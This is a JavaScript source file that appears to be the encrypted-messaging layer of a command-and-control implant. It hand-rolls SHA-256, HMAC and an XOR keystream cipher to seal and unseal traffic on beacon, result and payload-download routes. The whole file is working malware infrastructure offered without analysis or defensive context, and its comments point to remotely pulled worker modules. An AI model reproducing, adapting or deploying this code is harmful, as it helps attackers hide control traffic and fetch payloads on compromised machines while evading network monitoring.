// Channel ch1: N7Z2 single-layer, password = hex(session_key). ASCII-only.
// Expects globalThis.__C2_CHANNEL = {sid, key, v, pack} or IPC /tmp/c2_ipc/channel.json
(function (g) {
  if (g.__c2ChannelSeal && g.__c2ChannelOpen) return;

  function __u8(a) { return a instanceof Uint8Array ? a : new Uint8Array(a); }
  function __sha256(data) {
    var K = new Uint32Array([
      0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
      0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
      0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
      0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
      0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
      0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
      0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
      0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2]);
    function rr(x, n) { return (x >>> n) | (x << (32 - n)); }
    var u8 = __u8(data);
    var l = u8.length, bitLen = l * 8;
    var withPad = new Uint8Array(((l + 9 + 63) & ~63));
    withPad.set(u8); withPad[l] = 0x80;
    var dv = new DataView(withPad.buffer);
    dv.setUint32(withPad.length - 4, bitLen >>> 0, false);
    dv.setUint32(withPad.length - 8, Math.floor(bitLen / 0x100000000), false);
    var H = new Uint32Array([0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19]);
    var w = new Uint32Array(64);
    for (var i = 0; i < withPad.length; i += 64) {
      for (var j = 0; j < 16; j++) w[j] = dv.getUint32(i + j * 4, false);
      for (var j = 16; j < 64; j++) {
        var s0 = rr(w[j - 15], 7) ^ rr(w[j - 15], 18) ^ (w[j - 15] >>> 3);
        var s1 = rr(w[j - 2], 17) ^ rr(w[j - 2], 19) ^ (w[j - 2] >>> 10);
        w[j] = (w[j - 16] + s0 + w[j - 7] + s1) >>> 0;
      }
      var a = H[0], b = H[1], c = H[2], d = H[3], e = H[4], f = H[5], gg = H[6], h = H[7];
      for (var j = 0; j < 64; j++) {
        var S1 = rr(e, 6) ^ rr(e, 11) ^ rr(e, 25);
        var ch = (e & f) ^ ((~e) & gg);
        var t1 = (h + S1 + ch + K[j] + w[j]) >>> 0;
        var S0 = rr(a, 2) ^ rr(a, 13) ^ rr(a, 22);
        var maj = (a & b) ^ (a & c) ^ (b & c);
        var t2 = (S0 + maj) >>> 0;
        h = gg; gg = f; f = e; e = (d + t1) >>> 0; d = c; c = b; b = a; a = (t1 + t2) >>> 0;
      }
      H[0] = (H[0] + a) >>> 0; H[1] = (H[1] + b) >>> 0; H[2] = (H[2] + c) >>> 0; H[3] = (H[3] + d) >>> 0;
      H[4] = (H[4] + e) >>> 0; H[5] = (H[5] + f) >>> 0; H[6] = (H[6] + gg) >>> 0; H[7] = (H[7] + h) >>> 0;
    }
    var out = new Uint8Array(32);
    var od = new DataView(out.buffer);
    for (var i = 0; i < 8; i++) od.setUint32(i * 4, H[i], false);
    return out;
  }
  function __hmacSha256(keyBytes, msg) {
    var key = __u8(keyBytes), m = __u8(msg);
    if (key.length > 64) key = __sha256(key);
    var k = new Uint8Array(64); k.set(key);
    var o = new Uint8Array(64), ii = new Uint8Array(64);
    for (var j = 0; j < 64; j++) { o[j] = k[j] ^ 0x5c; ii[j] = k[j] ^ 0x36; }
    var inner = new Uint8Array(64 + m.length); inner.set(ii); inner.set(m, 64);
    var mid = __sha256(inner);
    var outer = new Uint8Array(64 + 32); outer.set(o); outer.set(mid, 64);
    return __sha256(outer);
  }
  function __utf8Encode(str) {
    var out = [], i = 0;
    for (; i < str.length; i++) {
      var c = str.charCodeAt(i);
      if (c < 0x80) out.push(c);
      else if (c < 0x800) { out.push(0xc0 | (c >> 6), 0x80 | (c & 0x3f)); }
      else if (c >= 0xd800 && c <= 0xdbff) {
        var c2 = str.charCodeAt(++i);
        var cp = 0x10000 + ((c - 0xd800) << 10) + (c2 - 0xdc00);
        out.push(0xf0 | (cp >> 18), 0x80 | ((cp >> 12) & 0x3f), 0x80 | ((cp >> 6) & 0x3f), 0x80 | (cp & 0x3f));
      } else {
        out.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 0x3f), 0x80 | (c & 0x3f));
      }
    }
    return new Uint8Array(out);
  }
  function __utf8Decode(u8) {
    var s = "", i = 0;
    u8 = __u8(u8);
    while (i < u8.length) {
      var c = u8[i++];
      if (c < 0x80) s += String.fromCharCode(c);
      else if (c < 0xe0) {
        var c2 = u8[i++];
        s += String.fromCharCode(((c & 0x1f) << 6) | (c2 & 0x3f));
      } else if (c < 0xf0) {
        var c2 = u8[i++], c3 = u8[i++];
        s += String.fromCharCode(((c & 0x0f) << 12) | ((c2 & 0x3f) << 6) | (c3 & 0x3f));
      } else {
        var c2 = u8[i++], c3 = u8[i++], c4 = u8[i++];
        var cp = ((c & 0x07) << 18) | ((c2 & 0x3f) << 12) | ((c3 & 0x3f) << 6) | (c4 & 0x3f);
        cp -= 0x10000;
        s += String.fromCharCode(0xd800 + (cp >> 10), 0xdc00 + (cp & 0x3ff));
      }
    }
    return s;
  }
  function __b64ToU8(b64) {
    var B = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    var s = String(b64 || "").replace(/[^A-Za-z0-9+\/=]/g, "");
    var pad = 0;
    if (s.charAt(s.length - 1) === "=") pad++;
    if (s.charAt(s.length - 2) === "=") pad++;
    s = s.replace(/=+$/, "");
    while (s.length % 4) s += "A";
    var bin = "", i = 0;
    while (i < s.length) {
      var a = B.indexOf(s.charAt(i++)), b = B.indexOf(s.charAt(i++));
      var c = B.indexOf(s.charAt(i++)), d = B.indexOf(s.charAt(i++));
      if (a < 0 || b < 0) break;
      var n = (a << 18) | (b << 12) | ((c < 0 ? 0 : c) << 6) | (d < 0 ? 0 : d);
      bin += String.fromCharCode((n >> 16) & 255, (n >> 8) & 255, n & 255);
    }
    if (pad) bin = bin.slice(0, bin.length - pad);
    var out = new Uint8Array(bin.length);
    for (var j = 0; j < bin.length; j++) out[j] = bin.charCodeAt(j);
    return out;
  }
  function __u8ToB64(u8) {
    var B = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    u8 = __u8(u8);
    var s = "", i = 0;
    for (; i + 2 < u8.length; i += 3) {
      var n = (u8[i] << 16) | (u8[i + 1] << 8) | u8[i + 2];
      s += B.charAt((n >> 18) & 63) + B.charAt((n >> 12) & 63) + B.charAt((n >> 6) & 63) + B.charAt(n & 63);
    }
    if (i < u8.length) {
      var n2 = u8[i] << 16;
      if (i + 1 < u8.length) n2 |= u8[i + 1] << 8;
      s += B.charAt((n2 >> 18) & 63) + B.charAt((n2 >> 12) & 63) + (i + 1 < u8.length ? B.charAt((n2 >> 6) & 63) : "=") + "=";
    }
    return s;
  }
  function __keystream(key, n) {
    var out = new Uint8Array(n), offset = 0, counter = 0;
    while (offset < n) {
      var buf = new Uint8Array(8), c = counter;
      for (var i = 7; i >= 0; i--) { buf[i] = c & 255; c = Math.floor(c / 256); }
      var block = __hmacSha256(key, buf);
      var take = Math.min(block.length, n - offset);
      out.set(block.subarray(0, take), offset);
      offset += take; counter++;
    }
    return out;
  }
  function __xor(a, b) {
    var o = new Uint8Array(a.length);
    for (var i = 0; i < a.length; i++) o[i] = a[i] ^ b[i];
    return o;
  }
  function __deriveKey(password, salt) {
    return __hmacSha256(__utf8Encode(String(password || "")), salt);
  }
  function __packOnce(password, payloadU8) {
    var salt = new Uint8Array(16);
    for (var i = 0; i < 16; i++) salt[i] = (Math.random() * 256) | 0;
    try {
      if (typeof crypto !== "undefined" && crypto.getRandomValues) crypto.getRandomValues(salt);
    } catch (_) {}
    var key = __deriveKey(password, salt);
    var ct = __xor(__u8(payloadU8), __keystream(key, payloadU8.length));
    var out = new Uint8Array(5 + 16 + ct.length);
    out[0] = 0x4e; out[1] = 0x37; out[2] = 0x5a; out[3] = 0x32; out[4] = 2;
    out.set(salt, 5); out.set(ct, 21);
    return out;
  }
  function __unpackOnce(password, blob) {
    var u8 = typeof blob === "string"
      ? (String(blob).indexOf("N7Z2B:") === 0 ? __b64ToU8(String(blob).slice(6)) : null)
      : __u8(blob);
    if (!u8 || u8.length < 21) throw new Error("ch1 short");
    if (u8[0] !== 0x4e || u8[1] !== 0x37 || u8[2] !== 0x5a || u8[3] !== 0x32 || u8[4] !== 2)
      throw new Error("ch1 magic");
    var salt = u8.subarray(5, 21);
    var ct = u8.subarray(21);
    return __xor(ct, __keystream(__deriveKey(password, salt), ct.length));
  }

  function __c2ChannelGet() {
    try {
      if (g.__C2_CHANNEL && g.__C2_CHANNEL.sid && g.__C2_CHANNEL.key) return g.__C2_CHANNEL;
    } catch (_) {}
    return null;
  }

  function __c2ChannelSeal(plainObjOrStr) {
    var ch = __c2ChannelGet();
    if (!ch) return null;
    var plain = typeof plainObjOrStr === "string" ? plainObjOrStr : JSON.stringify(plainObjOrStr);
    var blob = __packOnce(String(ch.key).toLowerCase(), __utf8Encode(plain));
    return { pack: "ch1", sid: String(ch.sid), enc: "N7Z2B:" + __u8ToB64(blob), v: 1 };
  }

  function __c2ChannelOpen(body) {
    if (!body || body.pack !== "ch1") return body;
    var ch = __c2ChannelGet();
    if (!ch || String(ch.sid) !== String(body.sid || "")) throw new Error("ch1 sid mismatch");
    var raw = __unpackOnce(String(ch.key).toLowerCase(), body.enc);
    var text = __utf8Decode(raw);
    try { return JSON.parse(text); } catch (_) { return text; }
  }

  function __c2ChannelPath(path) {
    var p = String(path || "");
    if (p.indexOf("?") >= 0) p = p.slice(0, p.indexOf("?"));
    if (p === "/beacon" || p === "/result") return true;
    if (p === "/war" || p === "/api/war") return true;
    if (p === "/api/promo/result" || p === "/api/asset/report") return true;
    // Hot module pull: request+response sealed after pe_worker_body issues channel.
    // Bootstrap pe_vm→body still uses N7Z2 (no sid yet).
    if (p === "/api/payload/get") return true;
    return false;
  }

  g.__c2ChannelSeal = __c2ChannelSeal;
  g.__c2ChannelOpen = __c2ChannelOpen;
  g.__c2ChannelPath = __c2ChannelPath;
  g.__c2ChannelGet = __c2ChannelGet;
})(typeof globalThis !== "undefined" ? globalThis : this);
